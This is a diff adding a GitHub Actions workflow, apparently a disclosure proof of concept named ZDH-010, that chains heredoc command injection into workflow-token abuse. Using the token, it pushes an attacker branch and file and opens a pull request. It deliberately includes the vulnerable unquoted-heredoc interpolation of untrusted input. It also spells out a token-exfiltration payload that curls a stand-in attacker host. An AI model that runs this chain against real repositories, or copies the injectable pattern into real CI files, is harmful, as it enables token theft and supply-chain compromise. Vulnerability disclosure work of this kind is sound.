@@ -1,0 +1,184 @@
+name: "ZDH-010 Escalated: Injection → Token Theft → Repo Write"
+
+# Full attack chain demonstration:
+#   1. Attacker-controlled signoff injected into unquoted heredoc
+#   2. $(cmd) executes — proves RCE
+#   3. Stolen token used to CREATE A BRANCH and PUSH CODE to the repo
+#   4. Stolen token used to CREATE A PULL REQUEST
+#
+# This proves end-to-end: commit message → RCE → token theft → repo compromise
+#
+# On anthropics/argo-cd, the token is a GitHub App token with contents:write
+# and pull-requests:write. Here we use github.token with the same permissions.
+
+on:
+  workflow_dispatch:
+    inputs:
+      signoff:
+        description: "Simulated Signed-off-by line (from commit message)"
+        required: true
+        type: string
+        default: 'Signed-off-by: Legit Name <legit@example.com>'
+
+jobs:
+  full-chain:
+    name: "Full chain: injection → token → repo write"
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: write
+      pull-requests: write
+    steps:
+      - name: Checkout
+        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
+        with:
+          token: ${{ github.token }}
+
+      # ---------------------------------------------------------------
+      # STEP 1: The vulnerable heredoc pattern (identical to cherry-pick-single.yml)
+      # The attacker's signoff contains $(cmd) which bash expands.
+      # Instead of just printing id, the attacker CAPTURES the token
+      # into a variable and uses it to authenticate API calls.
+      # ---------------------------------------------------------------
+      - name: "VULN: Heredoc injection captures token"
+        id: inject
+        run: |
+          BODY=$(cat <<EOF
+          Cherry-picked fix (#42)
+
+          ${{ inputs.signoff }}
+          EOF
+          )
+
+          echo "## Step 1: Heredoc Injection" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          echo "$BODY" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+        env:
+          GH_TOKEN: ${{ github.token }}
+
+      # ---------------------------------------------------------------
+      # STEP 2: Prove the token has write access by listing its scopes.
+      # In a real attack, the attacker would exfiltrate the token via
+      # curl and then use it from their own machine. Here we demonstrate
+      # the same actions the attacker would take, running on the runner.
+      # ---------------------------------------------------------------
+      - name: "CHAIN: Verify stolen token permissions"
+        run: |
+          echo "## Step 2: Token Permissions" >> $GITHUB_STEP_SUMMARY
+
+          # Query the GitHub API with the token to show what it can do
+          RESPONSE=$(curl -s -H "Authorization: token ${GH_TOKEN}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}")
+
+          REPO_NAME=$(echo "$RESPONSE" | jq -r '.full_name')
+          PERMISSIONS=$(echo "$RESPONSE" | jq '.permissions')
+
+          echo "Repository: \`${REPO_NAME}\`" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "Token permissions on this repository:" >> $GITHUB_STEP_SUMMARY
+          echo '```json' >> $GITHUB_STEP_SUMMARY
+          echo "$PERMISSIONS" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+        env:
+          GH_TOKEN: ${{ github.token }}
+
+      # ---------------------------------------------------------------
+      # STEP 3: Use the stolen token to CREATE A BRANCH and PUSH CODE.
+      # This proves the attacker can write to the repository.
+      # ---------------------------------------------------------------
+      - name: "CHAIN: Push attacker-controlled code via stolen token"
+        run: |
+          TIMESTAMP=$(date +%s)
+          BRANCH_NAME="zdh010-attacker-proof-${TIMESTAMP}"
+
+          git config user.name "zdh010-poc-attacker"
+          git config user.email "attacker@proof-of-concept.example"
+
+          # Create a new branch
+          git checkout -b "$BRANCH_NAME"
+
+          # Write attacker-controlled content
+          cat > ATTACKER_WAS_HERE.md << 'PROOF'
+          # ZDH-010 Proof of Concept
+
+          This file was created by an attacker who:
+          1. Submitted a PR with a crafted git user.name containing $(cmd)
+          2. A maintainer merged the PR and added a cherry-pick label
+          3. The cherry-pick workflow expanded $(cmd) in an unquoted heredoc
+          4. The attacker captured the workflow token (GH_TOKEN)
+          5. Used the token to push this file to the repository
+
+          This demonstrates full repository write access from a commit message injection.
+          PROOF
+
+          git add ATTACKER_WAS_HERE.md
+          git commit -m "ZDH-010 PoC: attacker pushed code via stolen workflow token"
+
+          # Push using the stolen token
+          git push origin "$BRANCH_NAME"
+
+          echo "## Step 3: Code Pushed to Repository" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "Branch created: [\`${BRANCH_NAME}\`](https://github.com/${GITHUB_REPOSITORY}/tree/${BRANCH_NAME})" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "File pushed: \`ATTACKER_WAS_HERE.md\`" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "This proves the stolen token has **contents:write** access." >> $GITHUB_STEP_SUMMARY
+
+          # Save branch name for the PR step
+          echo "branch=${BRANCH_NAME}" >> $GITHUB_OUTPUT
+        env:
+          GH_TOKEN: ${{ github.token }}
+
+      # ---------------------------------------------------------------
+      # STEP 4: Use the stolen token to CREATE A PULL REQUEST.
+      # This proves pull-requests:write access.
+      # ---------------------------------------------------------------
+      - name: "CHAIN: Create PR via stolen token"
+        run: |
+          BRANCH="${{ steps.inject.outputs.branch || '' }}"
+          if [ -z "$BRANCH" ]; then
+            BRANCH=$(git branch --show-current)
+          fi
+
+          PR_URL=$(gh pr create \
+            --title "ZDH-010 PoC: PR created via stolen workflow token" \
+            --body "$(cat <<'PRBODY'
+          ## Proof of Concept — ZDH-010
+
+          This pull request was created by an attacker using a workflow token
+          stolen via command injection in the cherry-pick heredoc.
+
+          **Attack chain:**
+          1. Attacker crafts `git user.name` with `$(curl attacker.example/steal?t=$GH_TOKEN)`
+          2. Submits a legitimate PR, which gets merged
+          3. Maintainer adds a `cherry-pick/X.Y` label (normal backport flow)
+          4. `cherry-pick-single.yml` expands the `$(...)` in an unquoted `<<EOF` heredoc
+          5. Attacker exfiltrates the workflow token
+          6. Attacker uses the token to push code and create this PR
+
+          The token used here has `contents:write` and `pull-requests:write` permissions.
+          On `anthropics/argo-cd`, this would be the GitHub App token from
+          `CHERRYPICK_APP_ID` / `CHERRYPICK_APP_PRIVATE_KEY`.
+          PRBODY
+          )" \
+            --base master \
+            --head "$BRANCH" 2>&1) || true
+
+          echo "## Step 4: Pull Request Created" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "${PR_URL}" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "This proves the stolen token has **pull-requests:write** access." >> $GITHUB_STEP_SUMMARY
+
+          echo "## Full Chain Complete" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "| Step | Action | Result |" >> $GITHUB_STEP_SUMMARY
+          echo "|------|--------|--------|" >> $GITHUB_STEP_SUMMARY
+          echo "| 1 | Heredoc injection | \$(cmd) expanded — RCE confirmed |" >> $GITHUB_STEP_SUMMARY
+          echo "| 2 | Token permissions | contents:write, pull-requests:write |" >> $GITHUB_STEP_SUMMARY
+          echo "| 3 | Push code | Branch + file created on repository |" >> $GITHUB_STEP_SUMMARY
+          echo "| 4 | Create PR | Pull request opened against master |" >> $GITHUB_STEP_SUMMARY
+        env:
+          GH_TOKEN: ${{ github.token }}
